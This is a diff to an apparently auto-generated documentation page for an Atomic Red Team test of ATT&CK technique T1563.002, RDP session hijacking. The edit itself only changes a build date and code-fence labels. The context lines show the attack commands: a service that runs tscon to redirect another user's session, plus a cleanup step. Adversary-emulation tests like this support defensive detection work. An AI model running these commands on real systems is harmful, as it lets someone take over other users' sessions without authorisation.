@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1563.002"
 attack_technique_name: "Remote Service Session Hijacking: RDP Hijacking"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1563.002/T1563.002.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "command_prompt"
 aliases:
   - "a37ac520-b911-458e-8aed-c5f1576d9f46"
@@ -58,7 +58,7 @@ tags:
 
 ### Command
 
-```commandprompt
+```cmd
 query user
 sc.exe create sesshijack binpath= "cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}"
 net start sesshijack
@@ -66,7 +66,7 @@ net start sesshijack
 
 ### Cleanup
 
-```commandprompt
+```cmd
 sc.exe delete sesshijack >nul 2>&1
 ```
 
